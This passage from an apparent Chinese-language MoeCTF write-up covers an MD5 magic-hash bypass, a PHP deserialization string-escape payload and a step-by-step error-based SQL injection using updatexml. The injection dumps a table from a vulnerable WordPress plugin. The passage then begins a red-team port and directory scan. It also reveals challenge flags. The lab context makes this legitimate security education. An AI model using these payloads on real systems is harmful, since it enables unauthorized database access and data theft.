&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        $md5Param1 = md5($param1);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        $md5Param2 = md5($param2);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if ($md5Param1 == $md5Param2) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            echo &amp;quot;O.O!! &amp;quot; . getenv(&amp;quot;FLAG&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        } else {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            echo &amp;quot;O.o??&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    } else {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        echo &amp;quot;o.O?&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;} else {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    echo &amp;quot;O.o?&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;?&amp;gt; O.o?
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;分析得知是 md5 绕过，通过构造 Payload 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;param1=s878926199a&amp;amp;param2=s155964671a
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;就可以到 flag 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{oops_file_get_contents_controllable_lWpZo5UIiqnxK8URcmyyVmfrVt_M9EtF}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;duo-ming-shi-san-qiang&quot;&gt;夺命十三枪&lt;a class=&quot;zola-anchor&quot; href=&quot;#duo-ming-shi-san-qiang&quot; aria-label=&quot;Anchor link for: duo-ming-shi-san-qiang&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; index.php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;highlight_file(__FILE__);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;require_once(&amp;#39;Hanxin.exe.php&amp;#39;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$Chant = isset($_GET[&amp;#39;chant&amp;#39;]) ? $_GET[&amp;#39;chant&amp;#39;] : &amp;#39;夺命十三枪&amp;#39;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$new_visitor = new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$before = serialize($new_visitor);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$after = Deadly_Thirteen_Spears::Make_a_Move($before);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;echo &amp;#39;Your Movements: &amp;#39; . $after . &amp;#39;&amp;lt;br&amp;gt;&amp;#39;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;try{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    echo unserialize($after);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}catch (Exception $e) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    echo &amp;quot;Even Caused A Glitch...&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;?&amp;gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; Hanxin.exe.php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if (basename($_SERVER[&amp;#39;SCRIPT_FILENAME&amp;#39;]) === basename(__FILE__)) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    highlight_file(__FILE__);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class Deadly_Thirteen_Spears{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    private static $Top_Secret_Long_Spear_Techniques_Manual = array(
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;di_yi_qiang&amp;quot; =&amp;gt; &amp;quot;Lovesickness&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;di_er_qiang&amp;quot; =&amp;gt; &amp;quot;Heartbreak&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;di_san_qiang&amp;quot; =&amp;gt; &amp;quot;Blind_Dragon&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;di_si_qiang&amp;quot; =&amp;gt; &amp;quot;Romantic_charm&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;di_wu_qiang&amp;quot; =&amp;gt; &amp;quot;Peerless&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;di_liu_qiang&amp;quot; =&amp;gt; &amp;quot;White_Dragon&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;di_qi_qiang&amp;quot; =&amp;gt; &amp;quot;Penetrating_Gaze&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;di_ba_qiang&amp;quot; =&amp;gt; &amp;quot;Kunpeng&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;di_jiu_qiang&amp;quot; =&amp;gt; &amp;quot;Night_Parade_of_a_Hundred_Ghosts&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;di_shi_qiang&amp;quot; =&amp;gt; &amp;quot;Overlord&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;di_shi_yi_qiang&amp;quot; =&amp;gt; &amp;quot;Letting_Go&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;di_shi_er_qiang&amp;quot; =&amp;gt; &amp;quot;Decisive_Victory&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;di_shi_san_qiang&amp;quot; =&amp;gt; &amp;quot;Unrepentant_Lethality&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    );
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public static function Make_a_Move($move){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        foreach(self::$Top_Secret_Long_Spear_Techniques_Manual as $index =&amp;gt; $movement){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            $move = str_replace($index, $movement, $move);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        return $move;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class Omg_It_Is_So_Cool_Bring_Me_My_Flag{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $Chant = &amp;#39;&amp;#39;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $Spear_Owner = &amp;#39;Nobody&amp;#39;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    function __construct($chant){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        $this-&amp;gt;Chant = $chant;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        $this-&amp;gt;Spear_Owner = &amp;#39;Nobody&amp;#39;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    function __toString(){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if($this-&amp;gt;Spear_Owner !== &amp;#39;MaoLei&amp;#39;){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            return &amp;#39;Far away from COOL...&amp;#39;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        else{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            return &amp;quot;Omg You&amp;#39;re So COOOOOL!!! &amp;quot; . getenv(&amp;#39;FLAG&amp;#39;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;?&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;0x00-pop-lian&quot;&gt;0x00 POP 链&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x00-pop-lian&quot; aria-label=&quot;Anchor link for: 0x00-pop-lian&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Omg_It_Is_So_Cool_Bring_Me_My_Flag::__construct()-&amp;gt;Omg_It_Is_So_Cool_Bring_Me_My_Flag::__toString()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;http:&#x2F;&#x2F;localhost:61356&#x2F;?chant=di_jiu_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang&amp;quot;;s:11:&amp;quot;Spear_Owner&amp;quot;;s:6:&amp;quot;MaoLei&amp;quot;;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;chu-qu-lv-you-de-xin-hai&quot;&gt;出去旅游的心海&lt;a class=&quot;zola-anchor&quot; href=&quot;#chu-qu-lv-you-de-xin-hai&quot; aria-label=&quot;Anchor link for: chu-qu-lv-you-de-xin-hai&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;打开发现 &lt;code&gt;&#x2F;wordpress&lt;&#x2F;code&gt; ，用 WPSCAN 扫发现没有什么可用的东西，扫不出漏洞插件，只能知道 WordPress 的版本，通过查看网页源代码可以发现一个 API 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;wp-content&#x2F;plugins&#x2F;visitor-logging&#x2F;logger.php
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过访问可以得到 &lt;code&gt;logger.php&lt;&#x2F;code&gt; 源码如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;*
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Plugin Name: Visitor auto recorder
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Description: Automatically record visitor&amp;#39;s identification, still in development, do not use in industry environment!
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Author: KoKoMi
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  Still in development! :)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;*&#x2F;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; 不许偷看！这些代码我还在调试呢！
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;highlight_file(__FILE__);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; 加载数据库配置，暂时用硬编码绝对路径
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;require_once(&amp;#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;&amp;#39; . &amp;#39;wp-config.php&amp;#39;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$db_user = DB_USER; &#x2F;&#x2F; 数据库用户名
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$db_password = DB_PASSWORD; &#x2F;&#x2F; 数据库密码
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$db_name = DB_NAME; &#x2F;&#x2F; 数据库名称
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$db_host = DB_HOST; &#x2F;&#x2F; 数据库主机
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; 这些是临时的代码
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ip = $_POST[&amp;#39;ip&amp;#39;];
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$user_agent = $_POST[&amp;#39;user_agent&amp;#39;];
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$time = stripslashes($_POST[&amp;#39;time&amp;#39;]);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; 检查连接是否成功
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if ($mysqli-&amp;gt;connect_errno) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    echo &amp;#39;数据库连接失败: &amp;#39; . $mysqli-&amp;gt;connect_error;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    exit();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$query = &amp;quot;INSERT INTO visitor_records (ip, user_agent, time) VALUES (&amp;#39;$ip&amp;#39;, &amp;#39;$user_agent&amp;#39;, $time)&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; 执行插入
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$result = mysqli_query($mysqli, $query);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; 检查插入是否成功
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if ($result) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    echo &amp;#39;数据插入成功&amp;#39;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;} else {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    echo &amp;#39;数据插入失败: &amp;#39; . mysqli_error($mysqli);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; 关闭数据库连接
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;mysqli_close($mysqli);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F;gpt真好用
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过分析代码可知可以进行 SQL 报错注入，那就试试！&lt;&#x2F;p&gt;
&lt;p&gt;构造 Payload 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ip=1&amp;amp;user_agent=1&amp;amp;time=&amp;#39;2023-08-28 16:15:40&amp;#39; or updatexml(1,concat(0x7e,database()),0)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得到数据库名 &lt;code&gt;wordpress&lt;&#x2F;code&gt; ，构造 Payload 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ip=1&amp;amp;user_agent=1&amp;amp;time=&amp;#39;&amp;#39; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&amp;#39;wordpress&amp;#39;)),0)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得到表名 &lt;code&gt;secret_of_kokomi, visitor_record&lt;&#x2F;code&gt; ，构造 Payload 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ip=1&amp;amp;user_agent=1&amp;amp;time=&amp;#39;&amp;#39; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&amp;#39;wordpress&amp;#39; and table_name=&amp;#39;secret_of_kokomi&amp;#39;)),0)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得到字段名 &lt;code&gt;content, id&lt;&#x2F;code&gt; ，构造 Payload 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ip=1&amp;amp;user_agent=1&amp;amp;time=&amp;#39;&amp;#39; or updatexml(1,concat(0x7e,(select group_concat(content) from secret_of_kokomi)),0)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得到 &lt;code&gt;id&lt;&#x2F;code&gt; 字段的全部内容 &lt;code&gt;1,2,3&lt;&#x2F;code&gt; ，这时候就觉得怪了，这边 3 个，上面 &lt;code&gt;content&lt;&#x2F;code&gt; 字段就两个，不对哇，那就构造 Payload 如下看看&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ip=1&amp;amp;user_agent=1&amp;amp;time=&amp;#39;&amp;#39; or updatexml(1,concat(0x7e,(select group_concat(content) from secret_of_kokomi where id=&amp;#39;3&amp;#39;)),0)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得到回显如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{Dig_Thr0ugh_Eve2y_C0de_3
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;哦？这不是 flag 嘛，用 &lt;code&gt;mid()&lt;&#x2F;code&gt; 函数截取输出下，Payload 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ip=1&amp;amp;user_agent=1&amp;amp;time=&amp;#39;&amp;#39; or updatexml(1,concat(0x7e,mid((select group_concat(content) from secret_of_kokomi where id=&amp;#39;3&amp;#39;),20)),0)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得到回显如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Eve2y_C0de_3nd_Poss1bIlIti3s!!}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;拼起来就可以得到 flag 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{Dig_Thr0ugh_Eve2y_C0de_3nd_Poss1bIlIti3s!!}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;moeworld&quot;&gt;moeworld&lt;a class=&quot;zola-anchor&quot; href=&quot;#moeworld&quot; aria-label=&quot;Anchor link for: moeworld&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;下载附件可以得到加密的压缩包 &lt;code&gt;hint.zip&lt;&#x2F;code&gt; 以及 题目描述一份。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;本题你将扮演**红队**的身份，以该外网ip入手，并进行内网渗透，最终获取到完整的flag
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;题目环境：http:&#x2F;&#x2F;47.115.201.35:8000&#x2F;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;在本次公共环境中渗透测试中，希望你**不要做与获取flag无关的行为，不要删除或篡改flag，不要破坏题目环境，不要泄露题目环境！**
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;**注册时请不要使用你常用的密码，本环境密码在后台以明文形式存储**
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;hint.zip 密码请在拿到外网靶机后访问根目录下的**readme**，完成条件后获取
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;环境出现问题，请第一时间联系出题人**xlccccc**
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;对题目有疑问，也可随时询问出题人
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;0x00-xin-xi-shou-ji&quot;&gt;0x00 信息收集&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x00-xin-xi-shou-ji&quot; aria-label=&quot;Anchor link for: 0x00-xin-xi-shou-ji&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;p&gt;通过扫描靶机 IP 端口可以扫出以下内容&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;80&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;8000&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;8080&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;7777&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;22&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;8777&lt;&#x2F;p&gt;
&lt;p&gt;访问题目环境显示的是一个留言板，通过对 8000 端口进行目录扫描&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ dirsearch -u http:&#x2F;&#x2F;47.115.201.35:8000&#x2F;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[12:45:54] 200 -    1KB - &#x2F;change                                           
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[12:45:57] 200 -    2KB - &#x2F;console                                          
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[12:46:04] 302 -  199B  - &#x2F;index  -&amp;gt;  &#x2F;login                                
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[12:46:06] 200 -    1KB - &#x2F;login                                            
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[12:46:07] 200 -   74B  - &#x2F;logout                                           
